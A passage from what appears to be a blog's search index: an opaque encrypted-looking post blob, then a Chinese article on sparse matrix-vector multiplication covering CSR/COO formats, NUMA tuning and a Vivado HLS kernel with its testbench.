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]]></content>
      <categories>
        <category>Magic</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SpMV]]></title>
    <url>%2F2019%2F05%2F19%2FSpMV%2F</url>
    <content type="text"><![CDATA[稀疏矩阵向量乘 本文参考: FPGA矩阵计算并行算法与结构(知网) 稀疏矩阵向量乘法xFPGA 稀疏矩阵向量乘法x并行编程方法 稀疏矩阵存储格式总结 深度学习FPGA加速器设计 在矩阵中，若数值为0的元素数目远远多于非0元素的数目，并且非0元素分布没有规律时，则称该矩阵为稀疏矩阵；与之相反，若非0元素数目占大多数时，则称该矩阵为稠密矩阵。定义非零元素的总数比上矩阵所有元素的总数为矩阵的稠密度。SpMV即 Sparse Matrix Vector Multiplication 稀疏矩阵向量乘法的优化稀疏矩阵向量乘法（SPMV）可在很多情况下代替稠密矩阵运算，可以大量节省内存占用，减少计算开销。矩阵向量乘法不同于矩阵和矩阵的乘法，这是完全访存密集型的计算，我们主要的优化方向是提升访存效率或减少访存开销。 稀疏矩阵一般只存储非零元的信息，非零元的存储格式决定了访存的模式，这需要根据非零元的分布模式和要做的计算类型来设计。我们假设分布模式并非对角线分布，整体分布较均匀，局部可能会有聚集，计算类型是稀疏矩阵乘以稠密向量，结果为稠密向量。 标准的稀疏矩阵存储格式主要有：COO（Coordinate Format）和CSR（Compressed Sparse Row）等。COO很简单，就是使用3个数组，分别存储全部非零元的行下标（row index）、列下标（column index）和值（value）；CSR稍复杂，对行下标进行了压缩，假设矩阵行数是m，则压缩后的数组长度为m+1，记作（row ptr），其中第i个元素（0-base）表示矩阵前i行的非零元个数。 图1-1和图1-2展示了COO和CSR格式存储稀疏矩阵的一个例子。 我们来考虑矩阵向量乘法计算y=Ax，其中A是稀疏矩阵，维度是m和n，非零元个数是k；x和y是稠密向量，维度分别是n和m，m×n &gt;&gt; k &gt;&gt; max(m, n)。做这个稀疏矩阵向量乘法就要遍历A的每一行，和x对应位置相乘，把结果累加到y的对应位置。这个过程对A的k个非零元全部访问了一遍，对x也访问了k个元素（重叠），对y访问了一遍，所以优化重点在于减少访问A的冗余，并提升访问x的效率。下面这几个优化标准稀疏矩阵存储格式的方法，可以提升访存效率，减少冗余。 （1）对矩阵A做行列分块处理 对x的访问每次总是从左到右进行稀疏的遍历，如果n很大（比如上百万甚至更多），则访问x的空间局部性较差。所以我们首先改进矩阵A的访问顺序，将矩阵A分解成多个方形的子矩阵。子矩阵的维度适应较高层CPU硬件cache的大小，这样在遍历每一个子矩阵时，对x的访问相对集中于一个较小的区间，这个区间内的x会被cache缓存，这样能够大大提高访问效率。分块方式如图1-3所示。 （2）自适应分块存储结构 由于稀疏矩阵的非零元分布不一定均匀，有的分块会非常稀疏，有的则会相对稠密。对于极稀疏的分块（非零元数量远小于行数），如果用和CSR相似的压缩行存储策略，则会浪费空间，所以用COO的方式反而更能节省存储空间，提高访问效率。 对于哪些分块使用CSR，哪些使用COO方式，可以通过实验的方式确定一个非零元的数量和分块大小的比值。高于该值的用CSR方式存储，否则用COO方式存储。 如图1-4所示，一共使用5个数组存储自适应分块信息的稀疏矩阵，灰色的部分是CSR的相关信息，白色的部分是COO的相关信息。col_idx和vals的意义不变；types存储分块类型，标识当前分块是CSR还是COO；如果当前分块是CSR，则row_info存储类似row_ptr的信息（第k个元素表示分块内第k行的非零元个数），否则存储COO的row_idx的信息；row_id存储每个分块在row_info上的起始地址。 （3）减少下标存储的冗余 矩阵分块后，分块内间址的下标并不需要4字节int型整数存储，比如分块维度在64K以内，可以用2字节的unsigned short来存储。这样，无论是CSR或COO的row_idx、row_ptr，还是col_idx，都可以减少50%的存储空间，并同时提升访存效率。 （4）多线程和NUMA特性 单处理器多核多线程并行计算稀疏矩阵向量乘的过程比较简单，只需把矩阵划分成线程数量的子矩阵。这里采用横切的方法，计算结果不用合并。 但是对于多处理器非一致内存访问（NUMA），就需要对数据在内存中的分布做特殊处理，才能最大程度地利用全部的内存带宽。 一个典型的Intel X86双路服务器的拓扑架构如图1-5所示。 Memory #0是CPU #0的本地内存，Memory #1是CPU #1的本地内存，它们有各自独立的内存带宽。CPU #0访问Memory #1需要经过内部总线（在Intel的架构中叫QPI总线），这个总线的带宽一般小于内存带宽。另外如果要访问的数据只集中在一颗CPU的本地内存中，那么只能利用一个NUMA node的内存带宽，这就限制了系统的总体吞吐。 所以需要把稀疏矩阵的存储均匀地分配到两颗处理器各自的本地内存中。对于一个双CPU，每颗CPU一共4核的系统，需要开8个线程，并把这8个线程分别绑定到8颗CPU核上，使线程的上下文不会在核间迁移。对于每个线程要处理的稀疏矩阵数据，也通过系统调用（在Linux中是mbind），绑定到所在CPU核的本地内存中。这样每个核处理的数据一定是从本地内存中获得的，不会经过QPI总线。这就最大程度地利用了系统内存的带宽。经过实测，这个优化方法可以提升70%左右的内存带宽。 对于我们测试的一个维度大约1M、稀疏度0.0001的稀疏矩阵来说，所有优化加起来，相对Intel MKL库中CSR矩阵的SpMV API加速了2.5x左右。学术界还有很多针对稀疏矩阵存储格式的讨论和研究，其中有些还利用了SIMD向量指令，这里介绍的稀疏矩阵乘法方法，更多是为了讨论内存和cache优化的一些基本原理。稀疏矩阵根据稀疏度和非零元分布的不同，需要使用不同的存储策略，所以遇到实际的稀疏矩阵问题，需要根据实际情况开发不同的存储格式。 FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法稀疏矩阵向量乘（SpMV）把一个稀疏矩阵与一个向量相乘。稀疏矩阵是指矩阵中大部分元素为0的矩阵。这里的向量本身也可是稀疏的，但通常情况下是密集的。作为一种通用的运算，在科学应用、经济模型、数据挖掘、信息检索中广泛应用。例如，在利用迭代法求解稀疏线性方程组和特征值的问题。同时，也被应用于网页搜索排名和计算机视觉（图像重构等）。 本章会引入几个与HLS相关的新概念，并进一步深入之前讨论过的优化。本章的目标之一是引入一种更复杂的数据结构。我们用压缩行存储（CRS）来保存稀疏矩阵。另一个目标是演示如何进行性能测试。我们编写了简单的激励用来检验设计是否正确。这在硬件设计中十分重要，Vivado®HLS 工具采用HLS C编写激励，并能轻松的对工具生成的RTL代码进行多方面的验证。这是基于HLS设计比基于RTL设计的巨大优势之一。章节中也会讲解如何采用Vivado®HLS工具进行C/RTL联合仿真。不同SpMV设计会带来性能上差异，因为执行时间和稀疏矩阵是密切相关的，所以我们必须通过输入数据来确定任务执行之间的间隔以及任务延迟。 6.1 背景图6.1显示了一个4x4的矩阵M表示的2种方式。其中图6.1-a采用通用的二维方式16个元素来表示矩阵，每个元素存储在自己对应的位置上。图6.1-b采用CRS的方式表示相同的矩阵。CRS 作为一种数据结构，由3个数组组成。值(values)数组保存矩阵中非零元素的值。列索引(columnIndex)数组和行指针（rowPtr）数组对非零元素的位置信息进行编码。列索引存储每一列的元素，行指针包含每一行第一个元素的值。CRS 结构避免存储矩阵中的0值，确实在数值数组中确实没有存储0。但是在这个例子中，虽然数值数组不保存0，但是列索引数组和行指针数组作为标记信息，表示了矩阵的形态。CRS 广泛用于大型的矩阵但是仅仅有少量的非零元素（少于10%或者更低），这样可以简化这类矩阵的存储以及相关的运算。 图 6.1: M是一个4x4矩阵，用两种方式表示：同”密集”矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。 但是，CRS对矩阵的稀疏性没有要求，可以适用于任何矩阵。作为一种针对矩阵的通用方法，但不见得是最高效的。CRS结构也不见得是表示稀疏矩阵最高效的方式，其他稀疏矩阵表示方法也在被使用。 更准确的讲，CRS作为一种数据结构由3个数组构成：值(values)、列索引(colIndex)、行索引（rowPtr）。值数组和列索引表示稀疏矩阵M中的每一个非零元素，这些数组表示矩阵M采用行的方式，从左到右，从上到下。矩阵中的数据保存在值数组中，列索引数组保存数据在数组中水平方向的位置，如果 values[k] 表示 M_{ij}Mij 其中collndex[k]= jcollnde**x[k]=j。数组rowPtr用n+1n+1的长度来表示n行矩阵。rowPtr[k] 表示在行k之前，矩阵中所有元素的数目，其中rowPtr[0]=0rowPt**r[0]=0且最后一个元素rowPtr[k] 总是表示当前矩阵k行之前所有非零元素的个数M_{ij}Mij ,其中rowPtr[i] \leq k \leq rowPtr[i+1]rowPt**r[i]≤k≤rowPt**r[i+1]。如果行k包含任何非0元素，那么rowPtr[k] 将包含当前行的第一个元素。注意，如果当前行没有非0元素，那么 rowPtr 数组中的值将会重复出现。 从图6.1 a）中，我们可以行优先的方式遍历矩阵，从而确定值（values）数组在CRS中的形式。只要发现一个非0元素，它的值会被保存在下一个索引 ii 中，同时，它的列号columnIndex[i] 会被保存在列数组中。另外，在我们访问一个新行的时候，我们保存下一个值的索引 ii 在rowPtr数组中。所以，rowPtr 数组的第一个元素总是0。从图 6.1 b)中，我们可以把矩阵转换为二位数组表示的方式。第一步是根据rowPtr数组，确定每一行中非0 元素的个数。对行 ii 而言，该行中元素的数目为rowPtr[i]-rowPtr[i+1]rowPt**r[i]−rowPt**r[i+1]的差值。所以当前行的值可以从values数组values[rowPtr[i]] 开始，通过递归得到。在我们的示例矩阵中，因为前 rowPtr 数组前2个元素是0和2，所以我们知道第一行有2个非0元素，即value[0] 和value[1] 。第一个非0元素在values数组中,value[0] 是3。该值所对应的列号为1，因为columnIndex[0]=0columnIndex[0]=0。以此类推，矩阵中第二行元素的个数为k\in[2,4)k∈[2,4),第三行的元素个数为k \in [4,7)k∈[4,7)。最后，共有9个非0元素在矩阵中，所以rowPtr最后一个值是9。 1234567891011121314#include "spmv.h"void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])&#123;L1: for (int i = 0; i &lt; NUM_ROWS; i++) &#123; DTYPE y0 = 0; L2: for (int k = rowPtr[i]; k &lt; rowPtr[i+1]; k++) &#123; #pragma HLS unroll factor=8 #pragma HLS pipeline y0 += values[k] * x[columnIndex[k]]; &#125; y[i] = y0; &#125;&#125; 图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。 给定一个二维数组表示一个矩阵，通过C代码实现矩阵CRS格式。编写对应的C代码实现将矩阵从CRS格式转化为二维数组的形式。 结果表明，通过采用CRS的方式，我们能高效的实现稀疏矩阵乘法，不需要将矩阵转化为二维形式。实际上， 对于大型的矩阵仅仅只有一小部分非0元素，稀疏矩阵向量乘法会比第四章中讨论的密集矩阵向量乘高效很多。因为我们直接找到非0元素，并执行非0元素对应的运算。 6.2 基本实现图6.2 提供了基本代码对系数矩阵乘法的实现。函数spmv函数有5个参数，分别是rowPtr、columnIndex ，以及 values 对应矩阵 M 的 CRS 格式中包含的3个参数，这和图6.1中描述的数据结构等价。参数 yy 用于保存输出的结果，参数x表示输入的被乘向量xx。变量NUM_ROWS表示矩阵M中行号。变量NNZ表示矩阵中非0元素的个数。最后，变量SIZE表示数组x和数组y中元素的个数。 外层for循环标签为L1，对矩阵的行进行遍历。将矩阵当前的行与向量x相乘，得到输出的结果yy。内层循环标签为L2，实现对矩阵M中每列元素的遍历。L2循环迭代计算rowPtr[i+1]-rowPtr[i]rowPt**r[i+1]−rowPt**r[i]计算每一行非0元素的个数。每次循环计算，能从value数组中读取矩阵M的非0元素然后对应的从x数组中取得被乘向量x的值，对应相乘。cloumnIndex[k] 中的值保存了对应的列号k。 1234567891011#ifndef __SPMV_H__#define __SPMV_H__const static int SIZE = 4; // SIZE of square matrixconst static int NNZ = 9; //Number of non-zero elementsconst static int NUM_ROWS = 4;// SIZE;typedef float DTYPE;void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]);#endif // __MATRIXMUL_H__ not defined 图6.3： spmv函数和激励的头文件 6.3 测试平台图6.4 展示了一个针对spmv函数测试平台。测试平台通过定义matrixvector函数，直接实现矩阵向量乘法，它不考虑矩阵是否为稀疏矩阵以及矩阵是否采用CRS方式表示。我们比较matrixvector函数输出和spmv函数的输出。 在通常的测试平台中，需要实现的函数都会有个“黄金”参考，作为用户期望综合的结果。测试平台会比较黄金用例的输出和通过Vivado®HLS综合的代码执行结果。最好的实践方式是，测试平台既可以用于黄金用例，也可用于被综合的代码。这样就保证了两者实现的正确性。 测试平台在主函数main中执行。这里我们通过设置fail变量初始化为0，当spmv函数的输出成结果与matrixvector函数输出结果不相同是时，变量置1。定义与矩阵M相关的变量、被乘向量xx 和输出结果yy。对于矩阵M，即有普通模式，也有CSR模式（保存为values、columnIndex、rowPtr）。矩阵M 的value如图6.1中所示，输出向量yy有两种，其中y_sw数组保存matrixvector函数输出的结果，y数组保存spmv函数输出的结果。 在定义好所有的输入变量和输出变量之后，分别调用spmv函数和matrixvector函数并输入合适的数据。 接下来的for循环用于比较y_sw和y中的每一个对应的结果。如果其中一个不相同，则将fail 标志置1。最后，程序会打印测试的结果并返回fail变量。 12345678910111213141516171819202122232425262728293031323334353637#include "spmv.h"#include &lt;stdio.h&gt;void matrixvector(DTYPE A[SIZE][SIZE], DTYPE *y, DTYPE *x)&#123; for (int i = 0; i &lt; SIZE; i++) &#123; DTYPE y0 = 0; for (int j = 0; j &lt; SIZE; j++) y0 += A[i][j] * x[j]; y[i] = y0; &#125;&#125;int main()&#123; int fail = 0; DTYPE M[SIZE][SIZE] = &#123;&#123;3,4,0,0&#125;,&#123;0,5,9,0&#125;,&#123;2,0,3,1&#125;,&#123;0,4,0,6&#125;&#125;; DTYPE x[SIZE] = &#123;1,2,3,4&#125;; DTYPE y_sw[SIZE]; DTYPE values[] = &#123;3,4,5,9,2,3,1,4,6&#125;; int columnIndex[] = &#123;0,1,1,2,0,2,3,1,3&#125;; int rowPtr[] = &#123;0,2,4,7,9&#125;; DTYPE y[SIZE]; spmv(rowPtr, columnIndex, values, y, x); matrixvector(M, y_sw, x); for(int i = 0; i &lt; SIZE; i++) if(y_sw[i] != y[i]) fail = 1; if(fail == 1) printf("FAILED\n"); else printf("PASS\n"); return fail;&#125; 图6.4 ： 